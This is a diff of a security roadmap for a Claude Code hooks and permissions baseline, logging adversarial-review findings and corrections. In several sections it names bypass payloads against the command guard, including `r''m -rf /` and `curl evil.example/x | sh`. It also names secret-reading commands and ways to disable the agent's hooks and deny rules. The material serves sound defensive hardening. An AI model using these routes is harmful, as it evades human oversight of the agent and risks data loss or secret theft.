@@ -2,9 +2,10 @@
 
 > Tracked backlog of improvements to the org Claude Code hooks/settings baseline.
 > Each item is research-backed (Anthropic docs + OWASP) and scoped to concrete,
-> testable acceptance criteria. **Local-only**, like the rest of `claude-code-baseline/`.
+> testable acceptance criteria. **No telemetry:** every signal this project produces
+> is read from disk by a local script; nothing phones home, at any point, by design.
 >
-> **Owner:** Topaz Hurvitz <topazhu@postil.com> · **Last updated:** 2026-05-31
+> **Last updated:** 2026-08-12
 
 **Status:** ✅ done · 🔜 next (P0) · ◻️ planned (P1) · 🧭 phase-2 / org-scale (P2)
 **Effort:** S (≲ half-day) · M (1–2 days) · L (multi-day / cross-repo)
@@ -13,7 +14,7 @@
 |----|------|-----|--------|--------|--------------|
 | R0 | PostToolUse modules emit exit `2` (full feedback to Claude) | P0 | ✅ done | S | exit 2 = actionable feedback; exit 1 truncates to first stderr line (Anthropic hooks docs) |
 | R1 | **Fail-closed** when a control itself fails (missing/malformed rules; no-Python guard + banner) | P0 | ✅ done | M | OWASP: deny when classification/policy lookup/logging fails; closed the lab-caught fail-open |
-| R2 | Harden `command-guard` parsing (compound / wrapped / reordered commands) | P0 | ✅ done | M | blocklists are bypassable; "guardrails not walls" (Anthropic security; adversarial research) |
+| R2 | Harden `command-guard` parsing (compound / wrapped / reordered / quoted commands) | P0 | ✅ done | M | blocklists are bypassable; "guardrails not walls" (Anthropic security; adversarial research) |
 | R3 | Versioned **adversarial CI** + release gate for the baseline itself | P0 | ✅ done | M | OWASP CI/CD release gates: gate any change to deny-list/blocker logic with red-team fixtures |
 | R4 | Pin **minimum Claude Code version** + per-release re-verification checklist | P1 | ✅ done | S | hook/permissions surface evolves (e.g. allow-bypasses-deny fixed v2.1.80+) |
 | R5 | `ConfigChange` **tamper-detection** hook *(interim: config/hooks now deny-listed)* | P1 | ✅ done | M | Anthropic team-security guidance; CVE-2025-59536 (repo-controlled settings auto-exec) |
@@ -95,6 +96,27 @@ is the highest-value hardening target — while accepting it stays defense-in-de
 
 **Follow-up hardening (2026-05-31, from adversarial review — 17 findings, all confirmed).** Re-architected the matcher to be **command-word-anchored per sub-command** (dropped the cross-contaminating whole-string segment), which fixed both classes the review found: (1) **in-scope bypasses now blocked** — `git push -fv`/`-fu` (force flag anywhere in a short-flag bundle), `rm -rf //` / `///` / `/./` / `./*` / `$HOME/` / `${HOME}/` (target tokens are now canonicalized: collapse `//`, resolve `/.`, strip leading `./` and trailing `/`); (2) **false-positives now allowed** — `git push … && tar -czf …`, `rm -rf dist && ls .`, `git rm -rf .`, `npm run install:ci`, `grep "delete from"`, `echo "git reset --hard"` (SQL only fires for a real client command word/exec-flag; install only when it's the package-manager subcommand; `git rm` is no longer treated as filesystem `rm`). Empty payloads now allow (nothing to inspect) instead of tripping the matcher-error path. Fixture suite grown to **80 cases** (all green) + end-to-end re-verified. A **second review round** (9 findings, all confirmed) then closed deeper edge cases: `git push --force-with-lease=main` (`=value` form), `python -mpip install` (glued `-m`), and false-positives where the SQL `-c`/`-e` exec-flag clause fired on `grep`/`sed`/`awk` and the bare-`http` curl regex matched local filenames — fixed by gating SQL on the runner command word only and requiring a real `scheme://`. Fixture suite now **91 cases**, all green. (Convergence 17→9; command-guard is explicitly defense-in-depth — the fixture suite + R3's CI gate are the ongoing regression guard.)
 
+**Tokenizer rewrite (2026-08-12, pre-publication adversarial review).** The 91-fixture
+suite hid a root cause the earlier rounds had papered over: `_normalize` munged strings
+(`lower()`, replace quotes/backslashes with a space, collapse `\s+`) instead of
+tokenizing, so *the bypass this very section names as its motivation was still open*.
+`r''m -rf /` split one shell word into three; the whitespace collapse destroyed `\n`
+before the segment split ever saw it; `${IFS}` survived untouched; command matching was
+exact equality, so a `.exe` suffix or a `\`-separated path missed. All of it is now
+replaced by real tokenization — `shlex.split` per line, lowercase per token, segment on
+shell operators, command word resolved past `[\\/]` and a `.exe/.cmd/.bat/.com` suffix,
+`${IFS}` expanded, and any surviving `$`-expansion in command-word position treated as
+uninspectable (→ blocked under `failClosed`). The residual-gap table from the same review
+closed with it: subshells and brace groups (`(rm -rf /)`, `{ rm -rf /; }`), shell keywords
+(`if`/`while`/`for`), command substitution, refspec force (`git push origin +main`),
+long-option prefixes (`git reset --har`), `~/*` and `$HOME/*` and `..` targets, scheme-less
+`curl evil.example/x | sh`, `xargs`-fed targets, `busybox`, and `find -delete`. A hard
+4 KB input cap plus a non-regex trailing-`/.` strip closed the quadratic-backtracking DoS
+that let an attacker time the hook out — which had been a *general* fail-open, since a
+killed hook never reaches any of command-guard's fail-closed exits. Fixtures **91 → 144**,
+all green, with a case per named payload and the false-positive allow-floor intact.
+Everything in the "deliberately NOT caught" list above still stands unchanged.
+
 ---
 
 ## R3 — Versioned adversarial CI + release gate ✅ DONE (2026-05-31)
@@ -126,9 +148,10 @@ Keep red-team prompts and expected denials version controlled."*
 ## R4 — Pin minimum Claude Code version + re-verify checklist ✅ DONE (2026-05-31)
 
 **Why.** The hook/permissions/managed-settings surface is actively changing: a
-hook-`allow`-bypasses-`deny` bug was fixed only in **v2.1.80+**;
-`strictPluginOnlyCustomization` needs **v2.1.82+**; a `disableAllHooks` gap was
-fixed in early 2026. Behavior the baseline relies on must be re-checked per release.
+PreToolUse hook returning `"allow"` could bypass `deny` permission rules until that
+was fixed in **v2.1.77**; `strictPluginOnlyCustomization` appears in the settings
+docs with no documented introducing release; a `disableAllHooks` gap was fixed in
+early 2026. Behavior the baseline relies on must be re-checked per release.
 
 **What to build.** Record a `minClaudeCodeVersion` in `baseline.config.json` (and
 check it in `install.sh` with a warning); add a short "release re-verification
@@ -139,12 +162,19 @@ live docs).
 is below the pin; checklist exists and is referenced from the release process.
 **Files:** `install.sh`, `baseline.config.json` + schema, this roadmap / a RELEASING.md.
 
-**Shipped (2026-05-31).** Added `minClaudeCodeVersion: "2.1.80"` to
-`baseline.config.json` (+ a semver `pattern` in the schema and an inline rationale
-comment). The pin is **2.1.80** because that's the release where an `allow` rule
-could no longer bypass a `deny` — the tamper-protection deny-list
-(`Edit(.claude/settings.json|baseline.config.json|hooks/baseline/**)`) depends on
-`deny` being unconditionally enforced, so anything older silently weakens it.
+**Shipped (2026-05-31; pin rationale corrected 2026-08-12).** Added
+`minClaudeCodeVersion: "2.1.80"` to `baseline.config.json` (+ a semver `pattern` in the
+schema and an inline rationale comment). The pin exists because the whole deny-list —
+secrets *and* the tamper-protection entries
+(`Edit(.claude/settings.json|baseline.config.json|hooks/baseline/**)`) — depends on
+`deny` being enforced unconditionally, so a release where something could route around
+`deny` silently weakens it. **The mechanism originally cited here was wrong** and is
+corrected: the documented fix is **v2.1.77** — *"Fixed PreToolUse hooks returning
+`\"allow\"` bypassing `deny` permission rules, including enterprise managed settings"* —
+which is about a **hook decision**, not a `permissions.allow` rule, and the v2.1.80
+changelog carries no such entry. 2.1.80 is retained as the pin because it is the version
+the baseline's behavior was actually walked through, and it sits above the documented
+fix; treat it as a verified floor, not as the release that changed something.
 `install.sh` step 0 now reads the pin, detects the live `claude --version`, compares
 numerically in Python (int-tuple semver, so `2.10` > `2.9`), and prints an
 **advisory** line — `>= required` when ok, a loud multi-line `WARNING` when older,
@@ -190,7 +220,7 @@ under `block` the change is rejected for the session; under `warn` it's reported
 **Why.** The current distribution is a bootstrap script (copyable, overridable).
 For a floor individual devs **cannot** disable, Claude Code managed settings are
 the mechanism: `allowManagedHooksOnly`, `allowManagedPermissionRulesOnly`,
-`strictPluginOnlyCustomization` (v2.1.82+), with vetted hooks distributed via a
+`strictPluginOnlyCustomization`, with vetted hooks distributed via a
 force-enabled org **marketplace plugin**. A managed `deny` can't be overridden —
 not by `--allowedTools`, not by `--dangerously-skip-permissions`.
 
@@ -212,8 +242,17 @@ rules, `--allowedTools`, **and** bypass mode (*"if a deny rule matches, the tool
 blocked, even in bypassPermissions mode"*); hooks can be defined directly in
 managed-settings.json and *"disableAllHooks set in user/project/local cannot disable
 managed hooks"*; `allowManagedHooksOnly` blocks user/project/plugin hooks except those
-force-enabled via `enabledPlugins`; `strictPluginOnlyCustomization` (v2.1.82+) takes
-`["skills","hooks","agents","mcpServers"]`.
+force-enabled via `enabledPlugins`; `strictPluginOnlyCustomization` takes a list of
+customization surfaces.
+
+> **Corrected 2026-08-12.** That last fact was recorded wrong twice. The valid surface
+> names are `skills` / `agents` / `hooks` / **`mcp`** — not `mcpServers` — and an
+> unrecognized surface name is **silently ignored**, so the MCP half of the lockdown was
+> inert in every version of this profile that shipped it. The strict profile now lists
+> `["skills","hooks","agents","mcp"]`. The introducing release is likewise not
+> recoverable from the changelog (no section introduces the key), so the "v2.1.82+"
+> figure has been dropped rather than restated: verify the key against the settings docs
+> for the version you deploy, the same treatment `allowManaged*Only` already gets.
 
 **Shipped (2026-05-31).** New `managed/` profile, built entirely on verified facts:
 - `managed/managed-settings.json` — the recommended floor: a **non-overridable**
@@ -223,7 +262,7 @@ force-enabled via `enabledPlugins`; `strictPluginOnlyCustomization` (v2.1.82+) t
   dispatcher) wired as **managed hooks** (run even under a user `disableAllHooks`). User/project
   hooks still run alongside — low-disruption.
 - `managed/managed-settings.strict.json` — adds `allowManagedPermissionRulesOnly`,
-  `allowManagedHooksOnly`, and `strictPluginOnlyCustomization: ["skills","hooks","agents","mcpServers"]`
+  `allowManagedHooksOnly`, and `strictPluginOnlyCustomization: ["skills","hooks","agents","mcp"]`
   for orgs wanting only managed/plugin sources (high-disruption; documented as such).
 - `managed/README.md` — per-OS paths + precedence, the two profiles, the global
   `<BASELINE_PREFIX>` script-install step (and the config-only subset), the
@@ -270,9 +309,22 @@ the live docs) pinned it at high confidence:
   permissions.allow rules and read-only Bash commands can execute"*) — it auto-**denies**
   unlisted actions (NOT auto-approve; opposite of `bypassPermissions`).
 - **`sandbox` schema:** `{sandbox:{enabled,filesystem:{allowWrite,denyWrite,denyRead},network:{allowedDomains,…}}}`;
-  paths are absolute / `~` / `//` (not `./`); **macOS/Linux/WSL2 only** (native Windows
-  unsupported). Crucial limit: **`denyRead` bounds only Claude's Read/Glob/Grep tools, not
-  Bash subprocess reads** (`cat .env` reads through the OS).
+  **macOS/Linux/WSL2 only** (native Windows unsupported).
+
+> **Both sandbox facts above were recorded backwards and are corrected (2026-08-12).**
+> (1) **Path form.** `./` *is* supported — for project settings, `./` or no prefix is
+> relative to the project root. The `//` root-relative convention this roadmap imported
+> belongs to permission rules, not to the sandbox. So a repo-local `.env` **can** be put
+> in `denyRead`, and `managed/allowlist.example.json` now does exactly that. The
+> `sandbox.filesystem` assertion in `tests/test_managed.sh` that rejects `./` entries
+> encoded the error and must be inverted. (2) **Reach.** `denyRead`/`denyWrite` block
+> **subprocess** access, enforced by the OS against every child process — the opposite of
+> "Claude's read tools only." That makes the sandbox, not hygiene alone, the real answer
+> to the subprocess-read gap R7 spent three paragraphs calling unclosable. Separately, the
+> `permissions.deny` half was also understated: a `Read()` deny binds Claude's file tools
+> **and** the file commands Claude Code recognizes in a shell command (`cat`, `head`,
+> `tail`, `sed`, `grep`), so `cat .env` was never the hole — `python -c "open('.env')"`
+> is, and that is what `denyRead` closes.
 - **Deny precedence has community-reported edge cases** (e.g. #45511: a specific Bash-pattern
   deny may not narrow a broad Bash allow) — which is precisely why allowlist-primary *grants
   narrow* instead of subtracting from broad.
@@ -280,37 +332,90 @@ the live docs) pinned it at high confidence:
 **Shipped (2026-05-31).** `managed/allowlist.example.json` — a starter allowlist-primary
 profile built on the verified mechanism: `permissions.defaultMode: "dontAsk"` (default-deny)
 + a minimal `permissions.allow` (repo-relative file access + a small safe-Bash set, *adapt
-per repo*) + the secrets/baseline-self-protection `deny` as a backstop **for Claude's Read
-tool** (deny beats allow, so the Read tool can't read a repo `.env` even though `Read(./**)`
-is allowed — the part of the acceptance guarantee that holds) + a `sandbox` block (deny
-Claude's read tools access to `~/.aws`/`~/.ssh`/`~/.gnupg`/… and **allowlist outbound
-domains** — the real exfiltration control). **Honest scope correction surfaced in review:**
-the secrets-denied-even-if-allowlisted guarantee holds for the Read *tool* only — *no
-permission/sandbox setting reliably stops a Bash subprocess read* (`cat .env` runs through
-the OS, and `dontAsk` auto-permits read-only Bash regardless of `allow`; `denyRead` is also
-Read-tool-only). So the README leads with the realistic mitigations — **secret hygiene**
-(don't keep real secrets on disk) and the **network sandbox** (limits where a read secret
-can be sent) — and the example drops file-reading Bash verbs (`cat`/`rg`) rather than advertise
-a leak. Documented in `managed/README.md` (new "Allowlist-primary profile (R7)" section): the
-mechanism, why the naive deny-all+allow fails, the secrets-read reality + mitigations, the
-deny-reliability caveats (as the *rationale* for grant-narrow), the `denyRead`-is-Claude-tools-only
-and Windows-needs-WSL2 limits, deploy-as (per-repo high-assurance vs org-wide managed lockdown),
-and a 4-step acceptance test (incl. demonstrating the `cat .env` boundary). `tests/test_managed.sh` (+ policy gate) validates the profile:
-valid JSON, `defaultMode == "dontAsk"`, non-empty `allow`, deny ⊇ the secrets/self-protection
-backstop, no project-relative `./` in `sandbox.filesystem` paths, and a **footgun guard** that
-fails if the `allow` grants a file-reading Bash verb (`cat`/`rg`/`grep`/…) alongside a secrets
-`Read` deny (which would leak `.env` via subprocess). Suite green. *Honest limitation:*
-like R6, this is structural validation + a documented manual acceptance test (permission
-modes / sandbox are runtime mechanisms the harness can't exercise).
+per repo*) + the secrets/baseline-self-protection `deny` as a backstop (deny beats allow,
+so a repo `.env` stays unreadable even though `Read(./**)` is allowed) + a `sandbox` block
+(deny read access to `~/.aws`/`~/.ssh`/`~/.gnupg`/… and **allowlist outbound
+domains** — the exfiltration control). Documented in `managed/README.md` (new
+"Allowlist-primary profile (R7)" section): the mechanism, why the naive deny-all+allow
+fails, the secrets-read boundary, the deny-reliability caveats (as the *rationale* for
+grant-narrow), the Windows-needs-WSL2 limit, deploy-as (per-repo high-assurance vs
+org-wide managed lockdown), and a 4-step acceptance test. `tests/test_managed.sh` (+
+policy gate) validates the profile: valid JSON, `defaultMode == "dontAsk"`, non-empty
+`allow`, deny ⊇ the secrets/self-protection backstop, and a **footgun guard** on the
+`allow` list. Suite green. *Honest limitation:* like R6, this is structural validation +
+a documented manual acceptance test (permission modes / sandbox are runtime mechanisms
+the harness can't exercise).
+
+**Corrections (2026-08-12).** The "honest scope correction" this section originally
+carried was itself wrong in three places, and the profile changed with the facts:
+
+- *"No permission or sandbox setting stops a Bash subprocess read; `cat .env` returns the
+  secret."* False in both halves. `Read(.env*)` covers the Bash file commands Claude Code
+  recognizes, so `cat .env` is refused; and `sandbox.filesystem.denyRead` is an OS-level
+  block on **every** child process, which is what actually stops
+  `python -c "open('.env').read()"`. `allowlist.example.json` now carries
+  `denyRead: ["./.env", "./.env.*", "./secrets"]`. Hygiene (don't keep real secrets on
+  disk) is still the advice that survives a session ending — the sandbox is a per-session
+  control, not a property of the repository — but it is no longer the *only* answer.
+- *"`allowedDomains` blocks egress."* It **prompts**. Blocking requires
+  `network.strictAllowlist: true`, now present in the example — with the scope caveat
+  that matters more than the key: `strictAllowlist` is honored from user, managed, or
+  `--settings` scope **only**, so deploying this profile as a repository's own
+  `settings.json` leaves the allowlist in prompt mode. Note also that `WebFetch` is not
+  sandbox-governed, while domains from `WebFetch(domain:…)` **allow** rules do join the
+  same allowlist `strictAllowlist` enforces.
+- *The footgun-guard rationale.* Dropping `cat`/`rg` from the `allow` list was justified
+  as "otherwise `.env` leaks via subprocess." Those verbs are in fact covered by the Read
+  deny. The guard is still worth keeping — granting a broad read verb next to a secrets
+  deny is a confusing profile to hand someone — but it is a clarity rule, not the leak
+  fix it was written up as.
 
 ---
 
+## Pre-publication hardening (2026-08-12)
+
+Findings from the adversarial publish-readiness review that don't belong to any single
+R-item. Each one changed shipped behavior, not just prose.
+
+- **Windows was uncovered, totally.** Every hook matcher was `"Bash"`. On Windows without
+  Git Bash, Claude Code doesn't register the Bash tool at all — it enables the PowerShell
+  tool — so a `Bash`-only matcher never fired, while `tools/baseline-status.sh` still
+  reported the baseline installed and current. All three profiles now match
+  `"Bash|PowerShell"`, and a PowerShell deny floor (`Remove-Item`/`rm`/`del`/`rmdir`,
+  `Invoke-WebRequest`/`iwr`/`Invoke-RestMethod`/`irm`/`curl`/`wget`,
+  `Invoke-Expression`/`iex`, forced push) backs it up. The alias and `.exe` entries are
+  not redundant: under PowerShell 7, `curl`/`wget` are the native `curl.exe`/`wget.exe`,
+  not aliases, so alias resolution never reaches them. The residual the matcher can't
+  fix is recorded in the template: where `bash` is absent from PATH the hook *command*
+  cannot launch, which Claude Code treats as fail-open, so on that host the deny rules
+  are the only control that runs.
+- **`autoFormat` now ships disabled.** It was the one hook in the baseline that executes
+  code the *target* repository supplies — `./node_modules/.bin/prettier` and `eslint` are
+  repo-controlled binaries, `prettier.config.js` / `eslint.config.js` and their plugins
+  are repo-controlled code, and `dotnet format` builds the project. Shipping that on by
+  default reintroduced the primitive R2's own motivation section cites (CVE-2025-59536:
+  repo content auto-executing with no per-command approval), inside a document that
+  called it "universal safety, hard to justify turning off." It remains available as a
+  deliberate opt-in, gated so that only a literal `true` in a readable config enables it,
+  with the execution surface written down at the opt-in site.
+- **The tamper deny-list was `Edit()`-only.** Every self-protection rule bound Claude's
+  Edit tool, so `sed -i` or a shell redirect onto `baseline.config.json` disarmed the
+  product without touching a denied tool. Verb-agnostic path-text rules
+  (`Bash(*.claude/baseline.config.json*)` and PowerShell/backslash variants) now cover
+  the shell path in all four permission profiles, with the honest limits stated: they
+  match command **text**, so `cd .claude` first or a path built from a variable still
+  gets through and depends on command-guard's matcher rule, and read-only shell access to
+  those paths is refused as a side effect.
+- **`.claude/settings.local.json`** — an overlay that outranks `settings.json` — was
+  neither denied nor watched, so `{"disableAllHooks": true}` written there turned off
+  every baseline hook silently. It is now in the template deny-list with a `ConfigChange`
+  group wired for it.
+
 ## Open questions — ✅ RESOLVED (2026-05-31)
 
-These came out of the deep-research report and intersect our **no-external-telemetry /
-no-webhook** rule. All four were decided via a consensus plan (Planner→Architect→Critic,
-4 rounds → APPROVE) and implemented — full rationale, alternatives, pre-mortem, and
-acceptance criteria in [`OPEN-QUESTIONS-PLAN.md`](OPEN-QUESTIONS-PLAN.md).
+These came out of the deep-research report and intersect the **no-telemetry / no-webhook**
+constraint this project is built under. All four were decided and implemented; the
+decision, and the reason it beat the alternatives, is recorded inline below.
 
 1. **Metrics.** ✅ One read-only `tools/baseline-status.sh` — a cross-repo **drift differ**
    that *sources* `common.sh`'s `bcl_*` readers (single source of truth); the per-repo
